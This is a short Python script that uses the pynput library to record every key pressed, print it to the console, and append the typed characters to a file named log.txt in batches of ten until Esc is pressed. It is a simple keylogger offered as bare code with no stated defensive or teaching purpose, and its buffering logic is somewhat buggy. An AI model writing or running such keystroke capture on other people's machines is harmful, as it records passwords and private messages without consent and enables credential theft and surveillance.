
from pynput import keyboard


count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        prev_key = -1
        for key in keys:
            k = str(key).replace("'", "")
            k_prev = str(keys[prev_key])
            if k.find("space") > 0 and k_prev.find("space") > 0:
                print(k)
                print(k_prev)
                continue
            elif k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            prev_key += 1


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
